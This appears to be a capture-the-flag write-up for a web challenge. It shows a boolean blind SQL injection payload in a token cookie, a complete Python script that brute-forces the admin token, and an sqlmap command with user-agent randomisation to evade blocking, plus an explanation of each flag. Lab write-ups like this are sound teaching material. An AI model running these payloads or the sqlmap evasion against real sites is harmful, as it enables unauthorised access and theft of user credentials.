1. Find the database card first, with ID 200.
2. You will figure out that you are dealing with boolean blind SQLi after missing around with the token in the /shop.
3. Figure out the length of the token using blind sqli [token=guest_token' and (select username from users1234567890No where username ='admin' and LENGTH(token)=20)='admin'--], you will get a welcome message proving that its 20, if you put 21 you won't get a welcome message. 
4. Script to brute force the token:
```python
import sys
import requests
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings for Burp Suite or other tools
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to perform Blind SQL Injection to extract the token
def sqli_token(url):
    # Initialize the extracted token as an empty string
    token_extracted = ""

    # Assuming token length is 20 characters (can be adjusted)
    for i in range(1, 21):  
        for j in range(48, 103):  # ASCII for 0-9 and a-f (hex characters)

            # Construct the SQLi payload
            sqli_payload = f"' and (select (substring(token,{i},1)) from users1234567890No where username='admin')='{chr(j)}'--" 
            # Send the request with the SQLi payload in the cookie
            cookies = {'token': 'guest_token' + sqli_payload}
            r = requests.get(url, cookies=cookies)

            # If the response DOES contain "Welcome, guest", we found the correct character
            if "Welcome, guest" in r.text:
                token_extracted += chr(j)
                sys.stdout.write('\r' + token_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + token_extracted + chr(j))
                sys.stdout.flush()
                
    return token_extracted

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s http://www.example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Retrieving administrator token...")

    token = sqli_token(url)
    
    print("\n(+) Admin token extracted: %s" % token)

if __name__ == "__main__":
    main()
```

## Note: 
it can also be solved using sqlmap with `--random-agent` as the application blocks requests if the useragent was `sqlmap`:

```bash
sqlmap -u http://localhost:1337/shop --cookie="token=*" --random-agent --string="Welcome, guest\!" -T users1234567890No --dump --level 5 --risk 3 --purge --threads 10
```
### Explanation:
`-u http://localhost:1337/shop`:

This specifies the target URL for the SQL injection attack. In this case, sqlmap will target the /shop page of a local server running on port 1337.

`--cookie="token=*"`:

This specifies that the SQL injection attempt will be made in the token cookie. The * indicates that sqlmap should attempt to inject SQL into the value of the token cookie.

`--random-agent`:

This option tells sqlmap to randomly select a User-Agent header for each request. This is useful for evading detection by WAFs (Web Application Firewalls) or security mechanisms that block suspicious User-Agents (e.g., SQLMap or automated tools).

`--string="Welcome, guest\!"`:

sqlmap will look for this string in the HTTP response to determine whether an injection was successful. If this string appears, it confirms that the SQL query was processed and matched a specific condition, helping detect blind SQL injection. The string is likely part of a welcome message returned when the query succeeds, such as "Welcome, guest!".

`-T users1234567890No`:

This option tells sqlmap to target the users1234567890No table in the database. The flag -T stands for table, meaning that the focus of the SQL injection is specifically on this table.

`--dump`:

This tells sqlmap to dump (extract) all the data from the users1234567890No table once it successfully finds an injection vulnerability. This is used to retrieve the contents of the table, such as usernames, tokens, and admin status.

`--level 5`:

This increases the testing depth of sqlmap. Levels range from 1 to 5, with 5 being the most aggressive and thorough. Higher levels test more parameters (like HTTP headers, cookies, and POST data) and try different payloads, but it takes more time.

`--risk 3`:

This increases the risk level of the tests to the highest, 3. Risk levels range from 1 to 3, with 3 indicating that sqlmap will attempt riskier or more intrusive SQL queries (like time-based or heavy UNION queries), which might lead to server crashes or be more easily detected.

`--purge`:

This option clears previous session files created by sqlmap. It ensures that all testing starts fresh, which is helpful when re-running the same command multiple times to ensure no old results are used.

`--threads 10`:

This tells sqlmap to use 10 concurrent threads to speed up the attack. Using multiple threads allows sqlmap to send more requests at once, which can make the injection process faster, but also increases the load on the server and might make the attack more detectable.